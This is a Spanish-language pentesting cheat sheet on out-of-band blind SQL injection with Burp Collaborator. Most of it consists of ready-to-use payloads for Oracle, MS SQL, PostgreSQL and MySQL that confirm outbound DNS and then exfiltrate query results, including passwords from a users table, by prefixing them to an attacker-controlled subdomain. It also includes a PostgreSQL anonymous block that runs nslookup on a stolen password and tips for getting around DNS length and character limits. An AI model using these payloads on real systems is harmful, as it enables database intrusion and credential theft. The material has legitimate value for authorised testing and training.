
---
Tags: #sqli #blind #collaborator #burpsuite 

---

La técnica OOB consiste en aprovechar funciones de la base de datos que realizan peticiones de red para enviar datos a un servidor externo (Burp Collaborator).

## 1. Detección y Confirmación (DNS Lookup)

Antes de intentar extraer datos, debemos confirmar si el servidor puede "salir" a internet.

| **SGBD**       | **Payload de Confirmación (DNS Lookup)**                                                                                                                                               |
| -------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Oracle**     | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual-- -` |
| **MS SQL**     | `exec master..xp_dirtree '//SUBDOMINIO.oastify.com/a'`                                                                                                                                 |
| **PostgreSQL** | `copy (SELECT '') to program 'nslookup SUBDOMINIO.oastify.com'`                                                                                                                        |
| **MySQL**      | `LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')`  <br>`SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`<br>(Solo Windows)                                                 |

---

## 2. Exfiltración de Datos (Data Exfiltration)

Para extraer información, concatenamos el resultado de una subconsulta como un prefijo del subdominio de Collaborator.

### A. Fórmulas de Exfiltración por SGBD

| **SGBD**       | **Sintaxis Maestra de Exfiltración**                                                                                                                                                                                      |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Oracle**     | `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'\|\|(SELECT YOUR-QUERY-HERE)\|\|'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual-- -` |
| **MS SQL**     | `DECLARE @p varchar(1024); SET @p=(QUERY); EXEC('master..xp_dirtree "//'+@p+'.SUBDOMINIO.com/a"')`                                                                                                                        |
| **PostgreSQL** | `DROP TABLE IF EXISTS cmd; CREATE TABLE cmd(t text); COPY cmd FROM PROGRAM 'nslookup '`                                                                                                                                   |
| **MySQL**      | `SELECT QUERY INTO OUTFILE '\\\\SUBDOMINIO.com\\a'` (Solo Windows)                                                                                                                                                        |

### B. Consultas de Extracción (Sustituir en `QUERY`)

Para poder elegir la fila y el dato exacto, usamos la lógica de `LIMIT` y `OFFSET`.

|**Objetivo**|**Query para insertar en la Sintaxis**|
|---|---|
|**Usuario actual**|`(SELECT user)`|
|**Base de datos**|`(SELECT current_database())` (Postgres) / `(SELECT database())` (MySQL)|
|**Nombre de Tabla**|`(SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0)`|
|**Dato Específico**|`(SELECT password FROM users LIMIT 1 OFFSET 0)`|

---

## 3. PostgreSQL: Bloque Anónimo (El más robusto)

Dado que PostgreSQL requiere a veces una estructura más compleja para manejar variables, este bloque es el más fiable para exfiltrar datos complejos:

SQL

```sql
DO $$
DECLARE data text;
BEGIN
   -- 1. Obtenemos el dato que queremos (ej: pass del primer usuario)
   SELECT password INTO data FROM users LIMIT 1 OFFSET 0;
   -- 2. Ejecutamos el comando de red concatenando el dato
   EXECUTE 'copy (SELECT '''') to program ''nslookup ' || data || '.TU_SUBDOMINIO.oastify.com''';
END;
$$;
```

---

## 4. Limitaciones Críticas y Soluciones

1. **Caracteres prohibidos en DNS:** Los nombres de dominio solo admiten `[a-z, 0-9, -]`. Si tu query devuelve un espacio o un símbolo (ej: `admin:password`), la petición DNS fallará.
    
    - **Solución:** Codifica en Hexadecimal o Base64 si el SGBD lo permite, o usa `REPLACE(query, ' ', '-')`.
        
2. **Longitud de etiquetas:** Un subdominio no puede superar los 63 caracteres.
    
    - **Solución:** Usa `SUBSTR(query, 1, 60)` para enviar el dato por partes si es muy largo.
        
3. **Privilegios:** Estas funciones suelen requerir permisos de administrador (`DBA`, `SA` o `SUPERUSER`).

---
# Referencias

Cheat Sheet de Burpsuite: [Enlace](https://portswigger.net/web-security/sql-injection/cheat-sheet)